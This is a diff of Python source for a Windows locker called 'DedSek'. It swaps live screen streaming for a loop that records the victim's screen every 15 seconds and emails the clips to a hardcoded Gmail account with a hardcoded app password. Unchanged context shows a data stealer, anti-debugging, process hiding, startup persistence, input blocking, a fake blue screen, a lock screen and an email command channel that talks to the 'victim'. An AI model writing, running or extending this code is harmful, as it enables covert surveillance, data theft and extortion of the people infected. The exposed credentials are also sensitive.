@@ -20,6 +20,9 @@ import smtplib
 import imaplib
 import email
 from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
 import cv2
 import numpy as np
 from PIL import ImageGrab
@@ -34,14 +37,79 @@ SKULL_BASE64 = "YOUR_BASE64_STRING_HERE"
 GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
-
-# RTMP Стрим
-RTMP_URL = "rtmp://live.twitch.tv/app/YOUR_STREAM_KEY"
-STREAM_FPS = 15
-STREAM_QUALITY = 50
 # ============================================================
 
 attempts_left = MAX_ATTEMPTS
+
+# ========== ЗАПИСЬ ЭКРАНА ==========
+def record_and_send_loop():
+    while True:
+        try:
+            video_path = os.path.join(tempfile.gettempdir(), f"screen_{int(time.time())}.avi")
+            
+            fourcc = cv2.VideoWriter_fourcc(*'XVID')
+            out = cv2.VideoWriter(video_path, fourcc, 10.0, (1280, 720))
+            
+            for i in range(150):
+                img = ImageGrab.grab()
+                frame = np.array(img)
+                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                frame = cv2.resize(frame, (1280, 720))
+                out.write(frame)
+                time.sleep(0.1)
+            
+            out.release()
+            send_video_email(video_path)
+            
+            try:
+                os.remove(video_path)
+            except:
+                pass
+            
+        except:
+            time.sleep(1)
+
+def send_video_email(file_path):
+    try:
+        file_size = os.path.getsize(file_path)
+        
+        if file_size > 20 * 1024 * 1024:
+            compressed_path = compress_video(file_path)
+            if compressed_path:
+                file_path = compressed_path
+        
+        msg = MIMEMultipart()
+        msg['Subject'] = f'📹 Экран - {os.environ.get("USERNAME", "Unknown")} - {time.strftime("%d.%m.%Y %H:%M:%S")}'
+        msg['From'] = GMAIL_LOGIN
+        msg['To'] = RECEIVER_EMAIL
+        
+        with open(file_path, 'rb') as f:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(f.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f'attachment; filename="screen_{int(time.time())}.avi"')
+            msg.attach(part)
+        
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
+        server.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
+        server.send_message(msg)
+        server.quit()
+    except:
+        pass
+
+def compress_video(input_path):
+    try:
+        output_path = input_path.replace('.avi', '_compressed.mp4')
+        command = [
+            'ffmpeg', '-i', input_path,
+            '-c:v', 'libx264', '-preset', 'ultrafast',
+            '-crf', '35', '-b:v', '200k',
+            '-s', '640x360', '-r', '10', '-y', output_path
+        ]
+        subprocess.run(command, capture_output=True, timeout=30)
+        return output_path
+    except:
+        return None
 
 # ========== ЧАТ С ЖЕРТВОЙ ==========
 class VictimChat:
@@ -61,32 +129,26 @@ class VictimChat:
         self.chat_window.configure(bg='black')
         self.chat_window.attributes('-topmost', True)
         
-        # Заголовок
         tk.Label(self.chat_window, text="💀 DedSek Messenger 💀", 
                 bg='black', fg='#00FF00', font=('Courier', 12, 'bold')).pack(pady=5)
         
-        # История сообщений
         self.chat_history = scrolledtext.ScrolledText(self.chat_window, 
                                                        bg='#0a0a0a', fg='#00FF00',
-                                                       font=('Courier', 10),
-                                                       height=20)
+                                                       font=('Courier', 10), height=20)
         self.chat_history.pack(padx=10, pady=5, fill='both', expand=True)
         self.chat_history.config(state='disabled')
         
-        # Поле ввода
         input_frame = tk.Frame(self.chat_window, bg='black')
         input_frame.pack(padx=10, pady=5, fill='x')
         
-        self.msg_entry = tk.Entry(input_frame, bg='#0a0a0a', fg='#00FF00',
-                                  font=('Courier', 10))
+        self.msg_entry = tk.Entry(input_frame, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10))
         self.msg_entry.pack(side='left', fill='x', expand=True)
         self.msg_entry.bind('<Return>', self.send_message)
         
         tk.Button(input_frame, text="▶", command=self.send_message,
-                 bg='#00FF00', fg='black', font=('Courier', 10, 'bold'),
-                 width=3).pack(side='right', padx=(5, 0))
+                 bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), width=3).pack(side='right', padx=(5, 0))
         
-        self.add_message("DedSek", "Ты можешь писать мне сюда. Но пароль это не даст.")
+        self.add_message("DedSek", "Пиши сюда. Но пароль это не даст.")
         self.check_incoming_messages()
     
     def send_message(self, event=None):
@@ -94,8 +156,6 @@ class VictimChat:
         if msg:
             self.add_message("ТЫ", msg)
             self.msg_entry.delete(0, tk.END)
-            
-            # Отправляем тебе на почту
             send_email(f"💬 Сообщение от жертвы:\n\n{msg}")
     
     def add_message(self, sender, msg):
@@ -105,7 +165,6 @@ class VictimChat:
         self.chat_history.config(state='disabled')
     
     def check_incoming_messages(self):
-        """Проверяет команды с почты"""
         def check():
             while self.chat_visible:
                 try:
@@ -124,7 +183,6 @@ class VictimChat:
                                 for part in msg.walk():
                                     if part.get_content_type() == "text/plain":
                                         command = part.get_payload(decode=True).decode()
-                                        
                                         if command.startswith("MSG:"):
                                             self.add_message("DedSek", command[4:])
                                         
@@ -137,74 +195,6 @@ class VictimChat:
                 time.sleep(5)
         
         threading.Thread(target=check, daemon=True).start()
-
-# ========== СТРИМ ЭКРАНА ==========
-def start_screen_stream():
-    try:
-        import subprocess
-        
-        command = [
-            'ffmpeg',
-            '-y', '-loglevel', 'error',
-            '-f', 'gdigrab',
-            '-framerate', str(STREAM_FPS),
-            '-i', 'desktop',
-            '-vf', 'scale=1280:720',
-            '-c:v', 'libx264',
-            '-pix_fmt', 'yuv420p',
-            '-preset', 'ultrafast',
-            '-tune', 'zerolatency',
-            '-b:v', '800k',
-            '-maxrate', '800k',
-            '-bufsize', '2000k',
-            '-g', '30',
-            '-f', 'flv',
-            RTMP_URL
-        ]
-        
-        subprocess.run(command, capture_output=True)
-    except:
-        pass
-
-def start_stream_alternative():
-    """Альтернативный стрим через OpenCV"""
-    try:
-        import cv2
-        import numpy as np
-        from PIL import ImageGrab
-        
-        # Размер для стрима
-        width, height = 1280, 720
-        
-        # Пробуем через ffmpeg pipe
-        command = [
-            'ffmpeg',
-            '-y', '-loglevel', 'error',
-            '-f', 'rawvideo',
-            '-vcodec', 'rawvideo',
-            '-s', f'{width}x{height}',
-            '-pix_fmt', 'bgr24',
-            '-r', str(STREAM_FPS),
-            '-i', '-',
-            '-c:v', 'libx264',
-            '-pix_fmt', 'yuv420p',
-            '-preset', 'ultrafast',
-            '-tune', 'zerolatency',
-            '-b:v', '800k',
-            '-f', 'flv',
-            RTMP_URL
-        ]
-        
-        pipe = subprocess.Popen(command, stdin=subprocess.PIPE, stderr=subprocess.DEVNULL)
-        
-        while True:
-            img = ImageGrab.grab()
-            frame = np.array(img)
-            frame = cv2.resize(frame, (width, height))
-            pipe.stdin.write(frame.tobytes())
-            
-    except:
-        pass
 
 # ========== СТИЛЕР ДАННЫХ ==========
 def steal_data():
@@ -405,13 +395,13 @@ to your computer.
 
 ENCRYPTION_FAILED.SYS
 
-*** STOP: 0x00000050 (0xFFFFF880009A3B28, 0x0000000000000001, 0xFFFFF80002A7C5B1, 0x0000000000000002)
+PAGE_FAULT_IN_NONPAGED_AREA
 
-*** ENCRYPTION_FAILED.SYS - Address FFFFF80002A7C5B1 base at FFFFF80002A0D000"""
+*** STOP: 0x00000050 (0xFFFFF880009A3B28, 0x0000000000000001, 0xFFFFF80002A7C5B1, 0x0000000000000002)"""
         
         lbl.config(text=bsod_text)
         bsod.update()
-        for i in range(30):
+        for i in range(10):
             try:
                 ctypes.windll.user32.BlockInput(True)
             except:
@@ -502,7 +492,6 @@ class WinLocker:
         
         global attempts_left
         
-        # Картинка
         try:
             img_data = base64.b64decode(SKULL_BASE64)
             img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
@@ -515,7 +504,6 @@ class WinLocker:
         except:
             pass
         
-        # Основное сообщение
         msg = """ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!
 
 ТЫ ДУМАЕШЬ ЧТО ЗНАЕШЬ ПАРОЛЬ? НЕТ!
@@ -541,7 +529,6 @@ $1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
                            font=('Courier', 9, 'bold'), justify='left')
         lbl_msg.place(relx=0.5, rely=0.42, anchor='center')
         
-        # Кнопка чата
         self.chat = VictimChat(self)
         chat_btn = tk.Button(self.win, text="💀 ЧАТ С DedSek 💀", 
                             command=self.chat.show,
@@ -549,7 +536,6 @@ $1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
                             font=('Courier', 12, 'bold'))
         chat_btn.place(relx=0.5, rely=0.72, anchor='center')
         
-        # Поле ввода пароля
         center_frame = tk.Frame(self.win, bg='black')
         center_frame.place(relx=0.5, rely=0.82, anchor='center')
         
@@ -606,11 +592,11 @@ if __name__ == "__main__":
     anti_debug()
     hide_process()
     
-    # Стилер
+    # Стилер данных
     threading.Thread(target=steal_data, daemon=True).start()
     
-    # Стрим экрана
-    threading.Thread(target=start_screen_stream, daemon=True).start()
+    # Запись экрана
+    threading.Thread(target=record_and_send_loop, daemon=True).start()
     
     add_to_startup()
     boot_animation()
